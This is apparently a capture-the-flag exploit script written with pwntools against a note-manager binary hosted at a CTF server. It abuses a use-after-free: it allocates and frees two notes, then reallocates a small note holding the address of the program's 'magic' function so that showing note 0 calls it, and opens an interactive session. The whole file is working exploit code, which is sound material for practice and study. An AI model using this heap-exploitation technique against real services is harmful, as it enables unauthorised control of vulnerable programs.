#!/usr/bin/env python

from pwn import *

#r = process('./memo_manager-beta')
r = remote('ctf.racterub.me', 3009)
context.log_level = 'debug'

def add_note(size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(content)

def delete_note(idx):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(idx))

def show_note(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))

elf = ELF('./memo_manager-beta')

#add_note(32, 'ddaa')
#add_note(32, 'ddaa')
#add_note(32, 'ddaa')
add_note(16, 'ddaa')
add_note(16, 'ddaa')
delete_note(0)
delete_note(1)
add_note(8, p32(elf.symbols['magic']))
show_note(0)
r.interactive()
